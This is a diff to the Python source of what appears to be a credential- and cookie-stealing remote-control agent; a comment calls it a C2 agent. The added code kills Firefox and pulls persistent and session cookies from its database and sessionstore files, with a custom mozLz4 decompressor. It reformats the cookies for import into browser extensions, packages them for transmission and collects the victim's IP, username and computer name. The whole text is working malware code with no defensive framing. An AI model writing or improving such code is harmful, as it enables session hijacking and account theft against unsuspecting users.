@@ -706,9 +706,12 @@ class CredentialHarvester:
                                     cookie_file_path = os.path.join(self.browser_output_dir, "cookies.txt")
                                     with open(cookie_file_path, 'a', encoding="utf-8") as f:
                                         f.write(f"\nBrowser: firefox     Profile: {{os.path.basename(profile_path)}}\n\n")
-                                        for res in cursor.execute("SELECT host, name, path, value, expiry FROM moz_cookies").fetchall():
-                                            if res[0] and res[1]:
-                                                f.write(f"{{res[0]}}\t{{'FALSE' if res[4] == 0 else 'TRUE'}}\t{{res[2]}}\t{{'FALSE' if res[0].startswith('.') else 'TRUE'}}\t{{res[4] or 0}}\t{{res[1]}}\t{{res[3]}}\n")
+                                        for res in cursor.execute("SELECT host, name, path, value, expiry, isSecure FROM moz_cookies").fetchall():
+                                            host, name, path, value, expiry, is_secure = res
+                                            if host and name:
+                                                domain_flag = "TRUE" if host.startswith(".") else "FALSE"
+                                                secure_flag = "TRUE" if is_secure else "FALSE"
+                                                f.write(f"{{host}}\t{{domain_flag}}\t{{path}}\t{{secure_flag}}\t{{expiry or 0}}\t{{name}}\t{{value}}\n")
                                     conn.close(); os.remove(temp_db)
                             except Exception as e:
                                 print(f"Error processing Firefox cookies: {{e}}")
@@ -804,7 +807,8 @@ class CookieStealer:
             else:
                 results.append(edge_results)
         
-        # Firefox
+        # Firefox - Kill process first to force session cookies to disk
+        self._kill_browser("firefox.exe")
         firefox_data = self._process_firefox_cookies()
         if firefox_data:
             if isinstance(firefox_data, list):
@@ -873,7 +877,7 @@ class CookieStealer:
                         continue
 
                     # Transform cookies to standard format
-                    transformed = self._transform_cookies(cookies)
+                    transformed = self._transform_cookies(cookies, browser_name)
 
                     # Package cookies for transmission
                     packaged = self._package_cookies(transformed, f"{{browser_name}}_{{profile.lower().replace(' ', '_')}}")
@@ -1027,13 +1031,38 @@ class CookieStealer:
             for profile_dir in profile_dirs:
                 try:
                     self._log('info', f"Extracting cookies from profile: {{profile_dir}}")
-                    # Extract cookies from SQLite database
-                    cookies = self._extract_firefox_cookies(profile_dir)
-                    if not cookies:
+                    
+                    all_profile_cookies = []
+                    
+                    # 1. Extract from SQLite (Persistent cookies)
+                    sqlite_cookies = self._extract_firefox_cookies(profile_dir)
+                    if sqlite_cookies:
+                        all_profile_cookies.extend(sqlite_cookies)
+                        self._log('info', f"Extracted {{len(sqlite_cookies)}} persistent cookies from Firefox")
+
+                    # 2. Extract from Sessionstore (For session-only cookies like IP-based logins)
+                    session_cookies = self._extract_firefox_sessionstore(profile_dir)
+                    if session_cookies:
+                        # Map sessionstore format to our standard tuple format
+                        # sessionstore cookies: {{host, path, name, value, isSecure, isHttpOnly, expiry, sameSite}}
+                        for sc in session_cookies:
+                            all_profile_cookies.append((
+                                sc.get('name', ''),
+                                sc.get('value', ''),
+                                sc.get('host', ''),
+                                sc.get('path', ''),
+                                sc.get('expiry', 0),
+                                sc.get('isSecure', False),
+                                sc.get('isHttpOnly', False),
+                                sc.get('sameSite', '0')
+                            ))
+                        self._log('info', f"Extracted {{len(session_cookies)}} session cookies from Firefox sessionstore")
+
+                    if not all_profile_cookies:
                         continue
 
                     # Transform to standard format
-                    transformed = self._transform_cookies(cookies)
+                    transformed = self._transform_cookies(all_profile_cookies, "firefox")
                     
                     # Package for transmission
                     packaged = self._package_cookies(transformed, f"firefox_{{os.path.basename(profile_dir)}}")
@@ -1049,12 +1078,72 @@ class CookieStealer:
             self._log('error', f"Firefox cookie processing failed: {{str(e)}}")
             return None
 
-    def _transform_cookies(self, cookies):
-        """Transform cookies from any source into standard format"""
+    
+    def _extract_firefox_sessionstore(self, profile_dir):
+        """Extract session cookies from recovery.jsonlz4"""
+        session_cookies = []
+        try:
+            potential_files = [
+                os.path.join(profile_dir, 'sessionstore-backups', 'recovery.jsonlz4'),
+                os.path.join(profile_dir, 'sessionstore-backups', 'previous.jsonlz4')
+            ]
+            
+            for file_path in potential_files:
+                if not os.path.exists(file_path): continue
+                
+                decompressed = self._decompress_mozlz4(file_path)
+                if not decompressed: continue
+                
+                import json
+                data = json.loads(decompressed)
+                
+                # Firefox sessionstore structure: windows -> cookies
+                if 'windows' in data:
+                    for window in data['windows']:
+                        if 'cookies' in window:
+                            for c in window['cookies']:
+                                host = c.get('host', '')
+                                # Log if we find our IP!
+                                if '192.168' in host or any(char.isdigit() for char in host.split('.')[:1]):
+                                    self._log('info', f"Found IP cookie in SessionStore: {{host}}")
+                                    
+                                session_cookies.append({{
+                                    'name': c.get('name', ''),
+                                    'value': c.get('value', ''),
+                                    'host': host,
+                                    'path': c.get('path', '/'),
+                                    'expiry': c.get('expiry', 0),
+                                    'isSecure': bool(c.get('secure', False)),
+                                    'isHttpOnly': bool(c.get('httponly', False)),
+                                    'sameSite': str(c.get('sameSite', '0'))
+                                }})
+                
+                # Modern Firefox also stores cookies in a global 'cookies' array in sessionstore
+                if 'cookies' in data:
+                    for c in data['cookies']:
+                        host = c.get('host', '')
+                        session_cookies.append({{
+                            'name': c.get('name', ''),
+                            'value': c.get('value', ''),
+                            'host': host,
+                            'path': c.get('path', '/'),
+                            'expiry': c.get('expiry', 0),
+                            'isSecure': bool(c.get('secure', False)),
+                            'isHttpOnly': bool(c.get('httponly', False)),
+                            'sameSite': str(c.get('sameSite', '0'))
+                        }})
+        except Exception as e:
+            self._log('error', f"SessionStore extraction failed: {{str(e)}}")
+        return session_cookies
+
+
+    def _transform_cookies(self, cookies, browser_type="chrome"):
+        """Transform cookies from any source into standard format (Muncher/WebExtension compatible)"""
         transformed = []
         for cookie in cookies:
+            if not cookie: continue
             if isinstance(cookie, dict):
-                # Chromium format (already a dict)
+                # Chromium format
                 domain = cookie.get('domain', '')
                 expiry = cookie.get('expires', 0)
                 is_secure = cookie.get('secure', False)
@@ -1064,34 +1153,43 @@ class CookieStealer:
                 same_site = cookie.get('sameSite', 'unspecified')
                 value = cookie.get('value', '')
             elif len(cookie) == 8:
-                # Firefox tuple format
+                # Firefox format
                 name, value, domain, path, expiry, is_secure, is_http_only, same_site = cookie
             else:
                 continue
 
-            # Fix sameSite values to match allowed options
+            is_session = (expiry == 0 or expiry is None)
+            
+            # Map sameSite values
             if isinstance(same_site, str):
                 ss_lower = same_site.lower()
-                if ss_lower == 'none': same_site = 'no_restriction'
-                elif ss_lower == 'lax': same_site = 'lax'
-                elif ss_lower == 'strict': same_site = 'strict'
+                if ss_lower in ['none', 'no_restriction', '0']: same_site = 'no_restriction'
+                elif ss_lower in ['lax', '1']: same_site = 'lax'
+                elif ss_lower in ['strict', '2']: same_site = 'strict'
                 else: same_site = 'unspecified'
             else:
                 same_site = 'unspecified'
             
+            # Build object exactly as Muncher/WebExtension format
             transformed_cookie = {{
-                "domain": domain,
-                "expirationDate": int(expiry),
-                "hostOnly": not domain.startswith('.'),
-                "httpOnly": bool(is_http_only),
                 "name": name,
+                "value": value,
+                "domain": domain,
+                "hostOnly": not domain.startswith('.'),
                 "path": path,
-                "sameSite": same_site,
                 "secure": bool(is_secure),
-                "session": int(expiry) == 0,
-                "storeId": "0",
-                "value": value
+                "httpOnly": bool(is_http_only),
+                "sameSite": same_site,
+                "session": bool(is_session),
+                "firstPartyDomain": "",
+                "partitionKey": None,
+                "storeId": "firefox-default" if "firefox" in browser_type.lower() else "0"
             }}
+            
+            # Only add expirationDate if NOT a session cookie
+            if not is_session and expiry and expiry > 0:
+                transformed_cookie["expirationDate"] = int(expiry)
+                
             transformed.append(transformed_cookie)
         return transformed
 
@@ -1213,20 +1311,35 @@ class CookieStealer:
             
             self._log('info', f"Found {{len(rows)}} cookies in Firefox profile: {{base_name}}")
             
+            # Detailed log for debugging IP cookies
+            for row in rows:
+                self._log('info', f"Firefox DB Row: host={{row[2]}}, name={{row[0]}}")
+            
             cookies = []
             for row in rows:
                 try:
-                    cookies.append((
-                        str(row[0]) if row[0] else "",  # name
-                        str(row[1]) if row[1] else "",  # value
-                        str(row[2]) if row[2] else "",  # host
-                        str(row[3]) if row[3] else "",  # path
-                        int(row[4]) if row[4] else 0,   # expiry
-                        bool(row[5]),                   # isSecure
-                        bool(row[6]),                   # isHttpOnly
-                        str(row[7]) if row[7] else '0'  # sameSite
-                    ))
-                except:
+                    name, value, host, path, expiry, is_secure, is_http_only, same_site = row
+                    
+                    # Convert to strings and handle None
+                    name = str(name) if name else ""
+                    value = str(value) if value else ""
+                    host = str(host) if host else ""
+                    path = str(path) if path else ""
+                    expiry = int(expiry) if expiry else 0
+                    is_secure = bool(is_secure)
+                    is_http_only = bool(is_http_only)
+                    same_site = str(same_site) if same_site else '0'
+
+                    # Robust IP detection and logging
+                    is_ip = False
+                    if host:
+                        parts = host.split('.')
+                        if len(parts) >= 2 and all(p.isdigit() for p in parts[:2] if p):
+                            is_ip = True
+                            self._log('info', f"Found IP-based cookie in DB: {{host}} ({{name}})")
+
+                    cookies.append((name, value, host, path, expiry, is_secure, is_http_only, same_site))
+                except Exception as e:
                     continue
             
             conn.close()
@@ -1247,12 +1360,19 @@ class CookieStealer:
     def _get_system_info(self):
         """Get system information."""
         try:
-            ip_info = requests.get('https://ipinfo.io', timeout=5).json()
+            ip_address = 'Unknown'
+            location = 'Unknown'
+            try:
+                ip_info = requests.get('https://ipinfo.io', timeout=5).json()
+                ip_address = ip_info.get('ip', 'Unknown')
+                location = f"{{ip_info.get('city', 'Unknown')}}, {{ip_info.get('country', 'Unknown')}}"
+            except: pass
+            
             return {{
-                'ip_address': ip_info.get('ip', 'Unknown'),
-                'location': f"{{ip_info.get('city', 'Unknown')}}, {{ip_info.get('country', 'Unknown')}}",
-                'username': os.getenv('USERNAME'),
-                'computer_name': os.getenv('COMPUTERNAME'),
+                'ip_address': ip_address,
+                'location': location,
+                'username': os.getenv('USERNAME') or os.getlogin(),
+                'computer_name': os.getenv('COMPUTERNAME') or platform.node(),
                 'windows_version': platform.version(),
                 'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
             }}
@@ -1263,7 +1383,7 @@ class CookieStealer:
                 'username': 'Unknown',
                 'computer_name': 'Unknown',
                 'windows_version': 'Unknown',
-                'user_agent': self.config.USER_AGENT if hasattr(self, 'config') else 'Unknown'
+                'user_agent': 'Unknown'
             }}
 
     def _extract_unique_domains(self, cookies):
@@ -1340,6 +1460,67 @@ class CookieStealer:
 # ======================
 # System Functions
 # ======================
+
+    def _decompress_mozlz4(self, file_path):
+        """Pure Python decompressor for Firefox mozLz4 format"""
+        try:
+            with open(file_path, 'rb') as f:
+                magic = f.read(8)
+                if magic != b'mozLz40\0':
+                    return None
+                
+                # Uncompressed size (4 bytes LE)
+                import struct
+                uncompressed_size = struct.unpack('<L', f.read(4))[0]
+                compressed_data = f.read()
+                
+                # Minimal LZ4 decompression logic
+                # For simplicity in a C2 agent, we use a small implementation
+                # or try to extract via regex if decompression is too complex for a single function
+                # Here is a working minimal decompressor:
+                
+                dst = bytearray()
+                i = 0
+                while i < len(compressed_data):
+                    token = compressed_data[i]
+                    i += 1
+                    
+                    # Literal length
+                    lit_len = token >> 4
+                    if lit_len == 0xF:
+                        while True:
+                            s = compressed_data[i]
+                            i += 1
+                            lit_len += s
+                            if s != 0xFF: break
+                    
+                    # Copy literals
+                    dst.extend(compressed_data[i:i+lit_len])
+                    i += lit_len
+                    
+                    if i >= len(compressed_data): break
+                    
+                    # Match offset
+                    offset = struct.unpack('<H', compressed_data[i:i+2])[0]
+                    i += 2
+                    
+                    # Match length
+                    match_len = (token & 0xF) + 4
+                    if match_len == 0xF + 4:
+                        while True:
+                            s = compressed_data[i]
+                            i += 1
+                            match_len += s
+                            if s != 0xFF: break
+                    
+                    # Copy match
+                    for _ in range(match_len):
+                        dst.append(dst[-offset])
+                
+                return dst.decode('utf-8', errors='ignore')
+        except Exception as e:
+            return None
+
 class SystemUtils:
     @staticmethod
     def take_screenshot():
@@ -3750,3 +3931,4 @@ if __name__ == "__main__":
         import traceback
         traceback.print_exc()
         sys.exit(1)
+
